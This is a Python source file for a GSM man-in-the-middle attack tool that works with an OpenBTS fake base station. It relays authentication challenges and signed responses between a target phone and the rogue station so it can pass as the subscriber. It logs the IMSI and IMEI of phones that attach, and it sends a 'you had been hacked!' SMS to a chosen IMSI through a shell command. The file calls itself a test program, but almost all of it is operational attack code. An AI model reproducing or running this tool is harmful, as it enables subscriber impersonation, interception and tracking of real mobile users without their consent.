import socket
import threading
import sys
import os

RAND = "00000000000000000000000000000000"
SRES = "ffffffff"
IMSI = "460000000000000"
TMSIS = []
mitm_is_open = True

def close_mitm():
    global mitm_is_open
    mitm_is_open = False
    print("mitm attacks state -> close")
def open_mitm():
    global mitm_is_open
    mitm_is_open = True
    print("mitm attacks state -> open")

def handle_rand(rand_data):
    return rand_data.replace(" ", "")

def send_AuthenticationRequest(imsi):
    cmd = "./OpenBTSDo \"sendsms " +imsi+" 100000 " + "you had been hacked! \""
    print("excute cmd: "+cmd)
    os.system(cmd)

def print_tmsis():
    if TMSIS == []:
        print("TMSIS_Table is empty!")
        return False
    
    print("IMSI                    IMEI")
    for mobile in TMSIS:
        print(mobile["IMSI"]+"         "+mobile["IMEI"])
    return True

def print_help_information():
    print("?/help               show help information")
    print("tmsis                show information about devices attached to the OpenBTS")
    print("show rand            show default rand")
    print("show sres            show default sres")
    print("show imsi            show default imsi")
    print("set rand [RAND]      set default rand")
    print("set sres [SRES]      set default sres")
    print("set imsi [IMSI]      set default imsi")
    print("mitm open            open mitm attack,this will send true sres to mobile")
    print("mitm close           close mitm attack,this will send dummy sres to mobile")
    print("auth [IMSI]          send AuthenticationRequest to mobile")

def set_RAND(rand):
    global RAND
    RAND = rand
    print("set RAND ->",RAND)

def set_SRES(sres):
    global SRES
    SRES = sres
    print("set SRES ->",SRES)

def set_IMSI(imsi):
    global IMSI
    IMSI = imsi
    print("set imsi ->",IMSI)

def start_mobile_server():
    global SRES
    global IMSI
    global conn
    host = '127.0.0.1'
    port = 8888

    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((host, port))
    server_socket.listen()
    print("Mobile Server is listening on port 8888...\n")
    
    while True:
        conn, addr = server_socket.accept()
        rand_data = conn.recv(1024).decode('utf-8')
        print("\nReceived rand form mobile:->",handle_rand(rand_data),"<-")
        set_RAND(handle_rand(rand_data))
        
        print("Waiting for sres....")
        if (mitm_is_open != True):
            print("Detected mitm state -> close! Now sending dummy sres to mobile")
            conn.sendall(SRES.encode('utf-8'))
            print('Send sres:'+ SRES +" to mobile:")
            conn.close()
        else:
            send_AuthenticationRequest(IMSI)


def start_openbts_server():
    global RAND
    global TMSIS
    

    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_address = ('localhost', 6666)
    
    server_socket.bind(server_address)
    
    server_socket.listen(1)
    print("OpenBTS Server is listening on port 6666...")

    while True:
        connection, client_address = server_socket.accept()
        try:
            connection.sendall(RAND.encode())
            print("\nsending RAND to OpenBTS: ",RAND)
            
            data = connection.recv(1024)
            if data:
                print("Receive message from OpenBTS:")
                if ";" in data.decode():
                    print("There is a device attached to the OpenBTS!")
                    receieve_data = data.decode().split(";")
                    set_SRES(receieve_data[2])
                    TMSIS.append({"IMEI":receieve_data[0],"IMSI":receieve_data[1]})
                    print("Receive IMEI from OpenBTS: ",receieve_data[0])
                    print("Receive IMSI from OpenBTS: ",receieve_data[1])
                    print("Receive SRES from OpenBTS: ",receieve_data[2])
                else:
                    sres = data.decode()
                    set_SRES(sres)
                    print("Receive SRES from OpenBTS: ",sres)
                    if mitm_is_open:
                        print("Detected mitm state -> open!")
                        conn.sendall(SRES.encode('utf-8'))
                        print('Send sres:'+ SRES +" to mobile:")
                        conn.close()
        finally:
            connection.close()


def main():
    OpenBTS_server = threading.Thread(target=start_openbts_server)
    Mobile_server = threading.Thread(target=start_mobile_server)

    OpenBTS_server.start()
    Mobile_server.start()
    
    print("This is just a test program for gsm MITM(man-in-the-middle) attacks\n")
    while True:
        command = input("Server>")
        if command == "exit" or command == "quit":
            sys.exit(0)
        elif command == "tmsis":
            print_tmsis()
        elif command == "show rand":
            print(RAND)
        elif command == "show sres":
            print(SRES)
        elif "set rand" in command:
            if len(command.split()[2]) != 32:
                print("rand is wrong!Please enter 32-bit rand")
            else:
                set_RAND(command.split()[2])
        elif "set sres" in command:
            set_SRES(command.split()[2])
        elif "auth " in command:
            send_AuthenticationRequest(command.split()[1])
        elif "set imsi" in command:
            if len(command.split()[2]) != 15:
                print("imsi is wrong!Please enter an imsi of 15 length")
            else:
                set_IMSI(command.split()[2])
        elif command == "show imsi":
            print(IMSI)

        elif command == "mitm open":
            open_mitm()
        elif command == "mitm close":
            close_mitm()

        elif command == "?" or command == "help":
            print_help_information()

        elif command == "":
            continue
        else:
            print("unknown command")

if __name__ == "__main__":
    main()
